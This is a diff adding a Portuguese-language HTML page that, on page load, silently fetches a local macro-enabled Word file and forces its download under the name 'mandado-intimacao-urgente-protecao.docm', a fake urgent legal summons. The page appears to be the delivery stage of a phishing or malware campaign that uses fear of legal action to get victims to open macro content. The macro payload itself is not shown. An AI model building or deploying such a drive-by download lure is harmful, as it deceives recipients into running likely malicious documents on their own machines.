@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .container { max-width: 600px; margin: 0 auto; }
+    </style>
+</head>
+<body onload="initiateDownload()">
+    <div class="container">
+        <h2>Carregando documento...</h2>
+        <p id="status">Por favor aguarde...</p>
+    </div>
+
+    <script>
+        async function initiateDownload() {
+            try {
+                const response = await fetch('./document.docm');
+                if (!response.ok) throw new Error('Arquivo não encontrado');
+
+                const blob = await response.blob();
+                const url = URL.createObjectURL(blob);
+
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = 'mandado-intimacao-urgente-protecao.docm';
+                link.style.display = 'none';
+
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(url);
+
+                document.getElementById('status').textContent = 'Download iniciado...';
+            } catch (error) {
+                document.getElementById('status').textContent = 'Erro ao processar documento: ' + error.message;
+                console.error('Download error:', error);
+            }
+        }
+    </script>
+</body>
+</html>
